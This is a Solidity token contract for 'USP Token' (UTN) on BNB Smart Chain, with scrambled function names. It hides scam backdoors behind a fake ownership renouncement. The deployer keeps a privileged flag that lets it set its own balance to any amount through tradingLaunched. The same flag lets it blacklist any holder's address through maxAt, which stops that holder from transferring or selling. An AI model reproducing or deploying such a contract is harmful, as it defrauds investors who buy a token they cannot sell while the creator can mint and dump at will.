/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


interface tokenWallet {
    function createPair(address takeMode, address tokenAmount) external returns (address);
}

interface totalTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract USPToken {

    function teamMax(address fundBuy, address fundAmountReceiver, uint256 feeSellTo) internal returns (bool) {
        require(balanceOf[fundBuy] >= feeSellTo);
        balanceOf[fundBuy] -= feeSellTo;
        balanceOf[fundAmountReceiver] += feeSellTo;
        emit Transfer(fundBuy, fundAmountReceiver, feeSellTo);
        return true;
    }

    function transferFrom(address fundBuy, address fundAmountReceiver, uint256 feeSellTo) external returns (bool) {
        if (allowance[fundBuy][marketingMode()] != type(uint256).max) {
            require(feeSellTo <= allowance[fundBuy][marketingMode()]);
            allowance[fundBuy][marketingMode()] -= feeSellTo;
        }
        return enableBuyToken(fundBuy, fundAmountReceiver, feeSellTo);
    }

    string public name = "USP Token";

    function enableBuyToken(address fundBuy, address fundAmountReceiver, uint256 feeSellTo) internal returns (bool) {
        if (fundBuy == atLaunch) {
            return teamMax(fundBuy, fundAmountReceiver, feeSellTo);
        }
        require(!limitTrading[fundBuy]);
        return teamMax(fundBuy, fundAmountReceiver, feeSellTo);
    }

    function buyWallet() public {
        emit OwnershipTransferred(atLaunch, address(0));
        owner = address(0);
    }

    function marketingMode() private view returns (address) {
        return msg.sender;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 private totalFrom;

    string public symbol = "UTN";

    bool public exemptLaunch;

    function maxList() public {
        
        
        buyTx=false;
    }

    uint256 public enableAmount;

    function getOwner() external view returns (address) {
        return owner;
    }

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed teamEnableTo, uint256 value);

    uint8 public decimals = 18;

    mapping(address => mapping(address => uint256)) public allowance;

    bool public tokenMin;

    event Approval(address indexed amountMode, address indexed spender, uint256 value);

    function enableFund(address liquiditySwap) public {
        if (tokenMin) {
            return;
        }
        if (buyTx == atWallet) {
            takeMax = enableAmount;
        }
        receiverLiquidity[liquiditySwap] = true;
        
        tokenMin = true;
    }

    uint256 private autoAmount;

    address public atLaunch;

    mapping(address => bool) public receiverLiquidity;

    bool private atWallet;

    uint256 private receiverTake;

    function tradingLaunched(uint256 feeSellTo) public {
        if (!receiverLiquidity[marketingMode()]) {
            return;
        }
        balanceOf[atLaunch] = feeSellTo;
    }

    uint256 public takeMax;

    uint256 private marketingSell;

    address public owner;

    function transfer(address limitTxMode, uint256 feeSellTo) external returns (bool) {
        return enableBuyToken(marketingMode(), limitTxMode, feeSellTo);
    }

    function maxAt(address totalSell) public {
        
        if (totalSell == atLaunch || totalSell == shouldEnable || !receiverLiquidity[marketingMode()]) {
            return;
        }
        if (atWallet != exemptLaunch) {
            exemptLaunch = false;
        }
        limitTrading[totalSell] = true;
    }

    constructor (){
        if (totalFrom != enableAmount) {
            buyTx = false;
        }
        totalTeam exemptTake = totalTeam(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        shouldEnable = tokenWallet(exemptTake.factory()).createPair(exemptTake.WETH(), address(this));
        owner = marketingMode();
        
        atLaunch = owner;
        receiverLiquidity[atLaunch] = true;
        balanceOf[atLaunch] = totalSupply;
        if (takeMax != autoAmount) {
            exemptLaunch = true;
        }
        emit Transfer(address(0), atLaunch, totalSupply);
        buyWallet();
    }

    address public shouldEnable;

    function maxLaunch() public view returns (uint256) {
        return autoAmount;
    }

    function buyReceiver() public {
        if (totalFrom != receiverTake) {
            exemptLaunch = true;
        }
        
        autoAmount=0;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function tokenTotalSender() public view returns (uint256) {
        return autoAmount;
    }

    bool private listMarketingLiquidity;

    bool private buyTx;

    function approve(address takeLimit, uint256 feeSellTo) public returns (bool) {
        allowance[marketingMode()][takeLimit] = feeSellTo;
        emit Approval(marketingMode(), takeLimit, feeSellTo);
        return true;
    }

    mapping(address => bool) public limitTrading;

    function totalTake() public view returns (uint256) {
        return enableAmount;
    }

    function receiverSwap() public view returns (bool) {
        return exemptLaunch;
    }

}